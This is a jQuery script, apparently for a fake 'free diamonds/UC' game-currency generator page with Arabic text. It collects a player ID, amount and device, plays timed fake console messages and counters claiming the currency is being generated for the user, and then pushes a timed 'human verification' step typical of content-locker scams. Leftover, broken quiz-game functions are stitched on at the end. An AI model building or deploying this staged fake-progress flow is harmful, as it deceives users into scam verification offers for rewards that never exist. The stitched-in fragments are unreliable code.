$(window).load(function(){
	
	$(document).on("click", ".button-1", function(){
		var id = $('.username-input').val();
		
		if( (Math.floor(id) != id && $.isNumeric(id) == false) || ( (getlength(id) >= 1) && (getlength(id) < 4) ) ){
			swal("Error", 'أدخل الأيدي بشكل صحيح', "error");
			$('.username-input').val('');
			return  
		}

		if( (Math.floor(id) != id && $.isNumeric(id) == false) || ( (getlength(id) >= 1) && (getlength(id) > 16) ) ){
			swal("Error", 'أدخل الأيدي بشكل صحيح', "error");
			$('.username-input').val('');
			return  
		}

		if( (Math.floor(id) != id && $.isNumeric(id) == false) || ( (getlength(id) >= 1) && (getlength(id) <= 15) ) ){
			$(".button-wrapper a").prop("href", "quiz1.html")


			return


	 
 				}

		 
		 
		else{
			$('.username-input-wrapper').addClass('shake animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
				$(this).removeClass('shake animated');
				$('.username-input').focus();
			});
		}
	});

	$(document).on("click",".button-2", function(){
		if ($selected_uc_value == '') {
			$(".diamonds-select-wrapper").addClass('shake animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
				$(this).removeClass('shake animated');
			});
		}
		else{
			 $.ajax({
				type: "GET",
				url: "dpart/dp2-2.php",
				success: function(dataprocess){
					$('.intro-content').html(dataprocess).hide().fadeIn();
					$('.diamonds-value-1').html($ag_amount_1);
					$('.diamonds-value-2').html($ag_amount_2);
					$('.diamonds-value-3').html($ag_amount_3);
					$(".email-step-content").addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
						$(this).removeClass('animated bounceIn');									
					});
					$selected_ag_value = '';
					function fixdiamondsBox($diamonds_parent_class) {
						resetdiamondsBoxes();
						if ($diamonds_parent_class.hasClass('diamonds-select-item-1')) {
							$selected_ag_value = $ag_amount_1;
						}
						if ($diamonds_parent_class.hasClass('diamonds-select-item-2')) {
							$selected_ag_value = $ag_amount_2;
						}
						if ($diamonds_parent_class.hasClass('diamonds-select-item-3')) {
							$selected_ag_value = $ag_amount_3;
						}
						$diamonds_parent_class.addClass('active');
						$diamonds_parent_class.addClass('animated jello').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
							$(this).removeClass('animated jello');
						});	
					}
					function resetdiamondsBoxes() {
						var $diamonds_list = $('.diamonds-select-item-1, .diamonds-select-item-2, .diamonds-select-item-3');	
						if ($diamonds_list.hasClass('active')) {
							$diamonds_list.removeClass('active');
						}
					}
					$('.diamonds-select-item').click(function() {
						fixdiamondsBox($(this))
					});
				}
			});
		}
	});


	$(document).on("click",".button-3", function(){
		if ($selected_ag_value == '') {

			$(".diamonds-select-wrapper").addClass('shake animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
				$(this).removeClass('shake animated');
			});
		}
		else{
			 $.ajax({
				type: "GET",
				url: "dpart/dp2-3.php",
				success: function(dataprocess){
					$('.intro-content').html(dataprocess).hide().fadeIn();
					$(".email-step-content").addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
						$(this).removeClass('animated bounceIn');									
					}); 
 					
 					$selected_device_value = '';
					function fixdiamondsBox($diamonds_parent_class) {
						resetdiamondsBoxes();
						if ($diamonds_parent_class.hasClass('diamonds-select-item-1')) {
							$selected_device_value = 'Android';
						}
						if ($diamonds_parent_class.hasClass('diamonds-select-item-2')) {
							$selected_device_value = 'iOS';
						}
						if ($diamonds_parent_class.hasClass('diamonds-select-item-3')) {
							$selected_device_value = 'Windows';
						}
						$diamonds_parent_class.addClass('active');
						$diamonds_parent_class.addClass('animated jello').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
							$(this).removeClass('animated jello');
						});	
					}

					function resetdiamondsBoxes() {
						var $diamonds_list = $('.diamonds-select-item-1, .diamonds-select-item-2, .diamonds-select-item-3');	
						if ($diamonds_list.hasClass('active')) {
							$diamonds_list.removeClass('active');
						}
					}

					$('.diamonds-select-item').click(function() {
						fixdiamondsBox($(this))
					});
				}
			});
		}
	});

	$(document).on("click",".button-4", function(){
		if ($selected_device_value == '') {
			$(".diamonds-select-wrapper").addClass('shake animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
				$(this).removeClass('shake animated');
			});
		}
		else{

			 $.ajax({
				type: "GET",
				url: "dpart/dp2-3-1.php",
				success: function(dataprocess){
					$('.intro-content').html(dataprocess).hide().fadeIn();
					$(".email-step-content").addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
						$(this).removeClass('animated bounceIn');									
					}); 
 					 
				}
			});
		}
	});

	$(document).on("click",".button-4-1", function(){
		if ($selected_device_value == '') {
			$(".diamonds-select-wrapper").addClass('shake animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
				$(this).removeClass('shake animated');
			});
		}
		else{

			 $.ajax({
				type: "GET",
				url: "dpart/dp2-4.php",
				success: function(dataprocess){
					$('.intro-content').html(dataprocess).hide().fadeIn();
					$(".email-step-content").addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
						$(this).removeClass('animated bounceIn');									
					}); 
 					$question_marked = '';
					function fixdiamondsBox($diamonds_parent_class) {
						resetdiamondsBoxes();
						if ($diamonds_parent_class.hasClass('diamonds-select-item-1')) {
							$question_marked = 'qs1';
						}
						if ($diamonds_parent_class.hasClass('diamonds-select-item-2')) {
							$question_marked = 'qs2';
						}
						if ($diamonds_parent_class.hasClass('diamonds-select-item-3')) {
							$question_marked = 'qs3';
						}
						$diamonds_parent_class.addClass('active');
						$diamonds_parent_class.addClass('animated jello').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
							$(this).removeClass('animated jello');
						});	
					}

					function resetdiamondsBoxes() {
						var $diamonds_list = $('.diamonds-select-item-1, .diamonds-select-item-2, .diamonds-select-item-3');	
						if ($diamonds_list.hasClass('active')) {
							$diamonds_list.removeClass('active');
						}
					}
					
					$('.diamonds-select-item').click(function() {
						fixdiamondsBox($(this))
					});
				}
			});
		}
	});

	$(document).on("click",".button-5", function(){
		if ($question_marked == '') {
			$(".diamonds-select-wrapper").addClass('shake animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
				$(this).removeClass('shake animated');
			});
		}
		else{
 			$('.content-section').append('<div class="320i"></div>');
			$.ajax({
				type: "GET",
				url: "dpart/dp3.php",
				success: function(dataprocess){
					$('.320i').html(dataprocess).hide().fadeIn();					
					$('.popup-step-content').addClass('popup-step-content-'+s_n);	
					$('.img-prepend').prepend($followers_icon);
					$.magnificPopup.open({
						items: {
							src: '.popup-step-wrapper',
						},
						type: 'inline',
						preloader: false,
						modal: true,
						fixedContentPos: true,
						fixedBgPos: true,
						callbacks: {	
							open: function() {							
								setTimeout(function() {
									$('.console-message').html($console_message_1_1 + ' ' + selected_network + ' ' + $console_message_1_2);	
									$('.console-message').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
										$(this).removeClass('animated bounceIn');	
									});
								}, 0 );
								setTimeout(function() {	
									$('.console-message').html($console_message_2 + '<span class="console-message-h">' + username + '</span>');	
									$('.console-message').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
										$(this).removeClass('animated bounceIn');	
									});
								}, 3000 );
								setTimeout(function() {	
									$('.console-message').html($console_message_3);	
									$('.console-message').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
										$(this).removeClass('animated bounceIn');	
									});
								}, 6500 );
								setTimeout(function() {	
									$(".console-loader-wrapper").fadeOut(function(){
										$(".console-count-wrapper").fadeIn(function(){
											$('.console-count-val').countTo({
												from: 0,
												to: $selected_uc_value,
												speed: 2000,
												refreshInterval: 5,
												formatter: function (value, options) {
													return value.toFixed(options.decimals);
												}
											});
										});
									});
									$('.console-message').html($console_message_4);	 
										
									$('.console-message').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
										$(this).removeClass('animated bounceIn');	
									});
								}, 9000 );
								setTimeout(function() {			
									$(".console-count-wrapper").fadeOut(function(){
										$('.console-loader-wrapper').html('<span class="lnr lnr-checkmark-circle console-message-s green-checkmark"></span>');
										$('.console-loader-wrapper').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
											$(this).removeClass('animated bounceIn');	
										});
										$(".console-loader-wrapper").fadeIn();
										$('.console-message').html('<span class="console-message-success">' + $console_message_5_1 + ' ' + $selected_uc_value + ' ' + $console_message_5_2 + ' ' + username + '</span>');					
										$('.console-message').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
											$(this).removeClass('animated bounceIn');	
										});
									});
								},11500);
								setTimeout(function() {	
									$(".console-loader-wrapper").fadeOut(function(){
										$(".console-count-wrapper-2").fadeIn(function(){
											$('.console-count-val-2').countTo({
												from: 0,
												to: $selected_ag_value,
												speed: 2000,
												refreshInterval: 5,
												formatter: function (value, options) {
													return value.toFixed(options.decimals);
												}
											});
										});
									});
									$('.console-message').html($console_message_4_1);	 
										
									$('.console-message').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
										$(this).removeClass('animated bounceIn');	
									});
								},14500); 
								setTimeout(function() {			
									$(".console-count-wrapper-2").fadeOut(function(){
										$('.console-loader-wrapper').html('<span class="lnr lnr-checkmark-circle console-message-s green-checkmark"></span>');
										$('.console-loader-wrapper').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
											$(this).removeClass('animated bounceIn');	
										});
										$(".console-loader-wrapper").fadeIn();
										$('.console-message').html('<span class="console-message-success">' + $console_message_5_1 + ' ' + $selected_ag_value + ' ' + $console_message_5_2 + ' ' + username + '</span>');					
										$('.console-message').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
											$(this).removeClass('animated bounceIn');	
										});
									});
								},17000);
								setTimeout(function() {	
									$('.console-loader-wrapper').html('<div class="sk-chase"><div class="sk-chase-dot"></div><div class="sk-chase-dot"></div><div class="sk-chase-dot"></div><div class="sk-chase-dot"></div><div class="sk-chase-dot"></div><div class="sk-chase-dot"></div></div>');
									$('.console-message').html($console_message_6);		
									$('.console-message').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
										$(this).removeClass('animated bounceIn');	
									});
								}, 20000 );
								setTimeout(function() {	
									$('.console-message').html($console_message_7);		
									$('.console-message').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
										$(this).removeClass('animated bounceIn');	
									});
								}, 22500 );
								setTimeout(function() {
									$('.console-loader-wrapper').html('<span class="lnr lnr-cross-circle console-message-s red-checkmark"></span>');
									$('.console-loader-wrapper').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
										$(this).removeClass('animated bounceIn');	
									});
									$('.console-message').html($console_message_8);		
									$('.console-message').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
										$(this).removeClass('animated bounceIn');	
									});
								}, 24000 );
								setTimeout(function() {	
									$('.console-loader-wrapper').html('<span class="lnr lnr-warning console-message-s orange-checkmark"></span>');
									$('.console-loader-wrapper').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
										$(this).removeClass('animated bounceIn');	
									});
									$('.console-message').html($console_message_9);		
									$('.console-message').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
										$(this).removeClass('animated bounceIn');	
									});
								}, 26500 );
								setTimeout(function() {	
									$('.popup-step-content').addClass('fadeOutUp animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){																						
										$(this).remove();		
										$.ajax({
											type: "GET",
											// url: "dpart/verification.php",
											success: function(dataprocess){
												console.clear();
												console.log("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
												$('.popup-step-wrapper').html(dataprocess).hide().fadeIn();												
												$(".verification-username").html(username);											
												$(".verification-uc-value").html($selected_uc_value);
												$(".verification-ag-value").html($selected_ag_value);
												human_verification_timer.init($human_verification_timer_value);												
											}
										});																	
									});
								}, 29000 );
							}
						}
					});	
				}
			});
		}
	});

	function getlength(number) {
    	return number.toString().length;
	}

	////////////////
// Verification Timer
////////////////

});


var human_verification_timer = function () {
    var time_left = 15;
    var keep_counting = 1;
    var time_out_msg = 'لم يتبقى الكثير من الوقت..';
    function countdown() {
        if(time_left < 2) {
            keep_counting = 0;
        }
        time_left = time_left - 1;
    }
    function add_leading_zero( n ) {
        if(n.toString().length < 2) {
            return '0' + n;
        } else {
            return n;
        }
    }
    function format_output() {
        var hours, minutes, seconds;
        seconds = time_left % 60;
        minutes = Math.floor(time_left / 60) % 60;
        hours = Math.floor(time_left / 3600);   
        seconds = add_leading_zero( seconds );
        minutes = add_leading_zero( minutes );
        hours = add_leading_zero( hours );
        return minutes + ' دقيقه و  ' + seconds + ' ثانية';
    }
    function timer_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = '<span>' + format_output() + '</span>';
    }
    function no_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = time_out_msg;
    }
    return {
        count: function () {
            countdown();
            timer_time_left();
        },
        timer: function () {
            human_verification_timer.count();
            if(keep_counting) {
                setTimeout("human_verification_timer.timer();", 1000);
            } else {
                no_time_left();
            }
        },
        init: function (n) {
            time_left = n;
            human_verification_timer.timer();
        }
    };
}();
















function myCourseFunction(course) {  
	document.getElementById("result").value = course;  
} 



let shuffledQuestions = [] //empty array to hold shuffled selected questions out of all available questions

function handleQuestions() { 
    //function to shuffle and push 10 questions to shuffledQuestions array
//app would be dealing with 10questions per session
    while (shuffledQuestions.length <= 9) {
        const random = questions[Math.floor(Math.random() * questions.length)]
        if (!shuffledQuestions.includes(random)) {
            shuffledQuestions.push(random)
        }
    }
}



function handleNextQuestion() {
    checkForAnswer() //check if player picked right or wrong option
    unCheckRadioButtons()
    //delays next question displaying for a second just for some effects so questions don't rush in on player
    setTimeout(() => {
        if (indexNumber <= 9) {
//displays next question as long as index number isn't greater than 9, remember index number starts from 0, so index 9 is question 10
            NextQuestion(indexNumber)
        }
        else {
            handleEndGame()//ends game if index number greater than 9 meaning we're already at the 10th question
        }
        resetOptionBackground()
    }, 1000);
}


function NextQuestion(index) {
    handleQuestions()

}



var spans = $('.diamonds-select-item');

spans.on('click', function(){
    spans.removeClass('active');
    $(this).addClass('active');
});